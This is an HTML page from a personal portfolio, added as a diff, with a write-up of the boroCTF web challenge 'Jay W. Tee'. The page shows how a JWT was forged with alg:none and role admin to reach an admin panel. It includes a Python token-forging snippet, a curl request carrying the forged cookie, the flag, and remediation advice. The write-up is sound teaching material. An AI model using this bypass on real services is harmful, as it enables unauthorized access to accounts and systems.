@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Jay W. Tee — boroCTF Writeup — Naim MyLibrary</title>
+  <meta name="description" content="Forged an unsigned JWT by changing alg to none and role to admin, then accessed the admin page." />
+  <link rel="stylesheet" href="../writeup-template.css" />
+</head>
+<body style="--accent:#73fbff;--accent-2:#c7ff68;">
+  <main class="case-shell">
+    <nav class="case-nav" aria-label="Writeup navigation">
+      <a class="case-brand" href="../index.html">
+        <span class="case-mark">NM</span>
+        <span>Naim MyLibrary</span>
+      </a>
+      <div class="case-links">
+        <a href="../../index.html">Portfolio</a>
+        <a href="../index.html">Library</a>
+        <a href="#walkthrough">Walkthrough</a>
+        <a href="#flag">Flag</a>
+      </div>
+    </nav>
+
+    <header class="case-hero">
+      <section class="case-brief">
+        <p class="eyebrow">boroCTF Web casefile</p>
+        <h1>Jay W. Tee</h1>
+        <p class="lead">Forged an unsigned JWT by changing alg to none and role to admin, then accessed the admin page.</p>
+        <div class="meta-row">
+          <span class="chip">CTF: boroCTF</span>
+          <span class="chip">Category: Web</span>
+          <span class="chip">Difficulty: Easy</span>
+          <span class="chip">No points listed</span>
+          <span class="chip">Solves not listed</span>
+          <span class="chip">Tags: JWT · alg:none · Auth Bypass</span>
+        </div>
+      </section>
+
+      <aside class="case-panel" aria-label="Writeup status panel">
+        <div class="case-panel-inner">
+          <p class="eyebrow">mission telemetry</p>
+          <div class="status-line"><span>Status</span><strong>Solved</strong></div>
+          <div class="status-line"><span>Method</span><strong>Recon → Analyze → Exploit</strong></div>
+          <div class="status-line"><span>Evidence</span><strong>Commands + reasoning</strong></div>
+          <div class="status-line"><span>Published</span><strong>2026-06-18</strong></div>
+          <div class="progress-track" aria-hidden="true"><span></span></div>
+          <p class="note" style="margin-top:18px;">This writeup is formatted for Naim's portfolio with the original solution flow preserved from the uploaded notes.</p>
+        </div>
+      </aside>
+    </header>
+
+    <div class="case-layout">
+      <aside class="case-toc">
+        <p>Case index</p>
+        <a href="#overview">00 / Overview</a>
+        <a href="#skills">01 / Skills</a>
+        <a href="#timeline">02 / Timeline</a>
+        <a href="#walkthrough">03 / Walkthrough</a>
+        <a href="#evidence">04 / Evidence</a>
+        <a href="#flag">05 / Flag</a>
+        <a href="#lessons">06 / Lessons</a>
+      </aside>
+
+      <article class="case-body">
+        <section class="case-section" id="overview" data-step="00">
+          <p class="eyebrow">operator brief</p>
+          <h2>Overview</h2>
+          <p>Forged an unsigned JWT by changing alg to none and role to admin, then accessed the admin page.</p>
+          <div class="evidence-grid">
+            <div class="evidence-card"><strong>Challenge</strong><p>Jay W. Tee from boroCTF.</p></div>
+            <div class="evidence-card"><strong>Category</strong><p>Web Writeups · Easy difficulty.</p></div>
+          </div>
+          
+        </section>
+
+        <section class="case-section" id="skills" data-step="01">
+          <p class="eyebrow">skills demonstrated</p>
+          <h2>Skills Demonstrated</h2>
+          <div class="skill-grid"><span>JWT Analysis</span><span>Cookie Testing</span><span>Access Control</span><span>curl</span></div>
+        </section>
+
+        <section class="case-section" id="timeline" data-step="02">
+          <p class="eyebrow">attack path</p>
+          <h2>Timeline</h2>
+          <div class="timeline"><div><strong>00</strong><p>Log in and capture the token cookie.</p></div><div><strong>01</strong><p>Decode the JWT header and payload.</p></div><div><strong>02</strong><p>Forge alg:none with role admin.</p></div><div><strong>03</strong><p>Send the new cookie to /admin and retrieve the flag.</p></div></div>
+        </section>
+
+        <section class="case-section" id="walkthrough" data-step="03">
+          <p class="eyebrow">solution notes</p>
+          <h2>Walkthrough</h2>
+          <h3>Challenge Description</h3>
+<p>We are given a web application at https://lt560zwl9uv6.boroctf.com. Upon logging in, we are assigned the role of guest and denied access to the /admin page. The goal is to escalate privileges and reach the admin panel.</p>
+<h3>Reconnaissance</h3>
+<p>After logging in with the credentials, intercepting the HTTP traffic revealed a token cookie being sent with every request:</p>
+<p>Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpqIiwicm9sZSI6Imd1ZXN0In0.e_KzHS9x0fDAOX77fCPr5RI19eLIipG-OTv4TQ9Vr9w</p>
+<p>Decoding the JWT (JSON Web Token) reveals:</p>
+<p>Header:</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>{
+&quot;alg&quot;: &quot;HS256&quot;,
+&quot;typ&quot;: &quot;JWT&quot;
+}</pre></div>
+<p>Payload:</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>{
+&quot;username&quot;: &quot;jj&quot;,
+&quot;role&quot;: &quot;guest&quot;
+}</pre></div>
+<p>The role field controls access. We need to change it to admin.</p>
+<p>Vulnerability — JWT alg:none</p>
+<p>JWT supports an alg field in the header that tells the server which algorithm to use to verify the signature. One valid (but dangerous) value is &quot;none&quot;, which means no signature is required.</p>
+<p>A misconfigured server that accepts alg: none will skip signature verification entirely — trusting whatever is in the payload without checking its integrity.</p>
+<h3>Exploitation</h3>
+<h3>Step 1 — Craft the malicious JWT</h3>
+<p>We build a new JWT with:</p>
+<p>alg set to none</p>
+<p>role changed from guest to admin</p>
+<p>An empty signature (just a trailing .)</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>import base64
+header  = base64.urlsafe_b64encode(b&#x27;{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}&#x27;).rstrip(b&#x27;=&#x27;).decode()
+payload = base64.urlsafe_b64encode(b&#x27;{&quot;username&quot;:&quot;jj&quot;,&quot;role&quot;:&quot;admin&quot;}&#x27;).rstrip(b&#x27;=&#x27;).decode()
+token = f&quot;{header}.{payload}.&quot;
+print(token)
+Output:</pre></div>
+<p>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImpqIiwicm9sZSI6ImFkbWluIn0.</p>
+<h3>Step 2 — Send the forged token</h3>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>curl -s -k \
+-H &quot;Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImpqIiwicm9sZSI6ImFkbWluIn0.&quot; \</pre></div>
+<p>https://lt560zwl9uv6.boroctf.com/admin</p>
+<h3>Step 3 — Access Granted 🎉</h3>
+<p>The server accepted the unsigned token and returned the admin panel with the flag:</p>
+<p>boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}</p>
+<h3>Root Cause</h3>
+<p>The server failed to reject JWTs with &quot;alg&quot;:&quot;none&quot;. This means it performed no cryptographic verification on the token, allowing any user to forge arbitrary claims (such as &quot;role&quot;:&quot;admin&quot;) without knowing the secret key.</p>
+<h3>Remediation</h3>
+<p>Reject alg:none explicitly on the server side.</p>
+<p>Whitelist allowed algorithms — never trust the alg field from the token itself.</p>
+<p>Use a well-maintained JWT library that handles this by default (e.g., python-jose, jsonwebtoken with explicit algorithm pinning).</p>
+<h3>Timeline</h3>
+<p>boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>[Table 1]</pre></div>
+<p>Step | Action</p>
+<p>1 | Logged in, received guest JWT</p>
+<p>2 | Decoded JWT, identified role claim</p>
+<p>3 | Forged token with alg:none and role:admin</p>
+<p>4 | Sent forged token to /admin</p>
+<p>5 | Flag retrieved ✅</p>
+        </section>
+
+        <section class="case-section" id="evidence" data-step="04">
+          <p class="eyebrow">proof locker</p>
+          <h2>Evidence</h2>
+          <div class="evidence-grid"><div class="evidence-card"><strong>Clue 01</strong><p>The token payload contains role: guest.</p></div><div class="evidence-card"><strong>Clue 02</strong><p>The server accepts alg:none with an empty signature.</p></div><div class="evidence-card"><strong>Clue 03</strong><p>Changing the role claim to admin grants access to /admin.</p></div></div>
+          
+        </section>
+
+        <section class="flag-vault" id="flag">
+          <p class="eyebrow">final artifact</p>
+          <h2>Flag</h2>
+          <code>boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}</code>
+        </section>
+
+        <section class="case-section" id="lessons" data-step="06">
+          <p class="eyebrow">after action report</p>
+          <h2>Lessons Learned</h2>
+          <ul><li>Never trust the alg value supplied by an attacker-controlled token.</li><li>JWT verification must pin allowed algorithms server-side.</li><li>Simple cookie inspection can reveal authorization logic.</li></ul>
+          <div class="footer-actions">
+            <a class="btn" href="../index.html">← Back to MyLibrary</a>
+            <a class="btn ghost" href="../../index.html">Back to Portfolio</a>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+</body>
+</html>
